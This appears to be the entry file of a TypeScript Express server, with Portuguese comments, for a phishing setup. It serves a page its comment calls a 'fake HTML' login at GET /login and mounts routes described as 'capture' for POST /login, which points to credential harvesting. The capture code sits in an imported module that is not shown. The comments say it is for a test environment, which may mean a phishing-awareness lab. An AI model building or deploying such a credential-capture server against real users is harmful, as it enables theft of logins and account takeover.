import express, { Application } from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import path from 'path';
import loginRoutes from './routes/login_route';

const app: Application = express();

// Habilita CORS para qualquer origem (para ambiente de teste)
app.use(cors());

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

//  Serve os arquivos da pasta frontend como estáticos
app.use(express.static(path.join(__dirname, '../../frontend')));

//  GET /login para servir o HTML falso
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, '../../frontend/index.html'));
});

// Rotas para captura (POST /login)
app.use('/', loginRoutes);

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});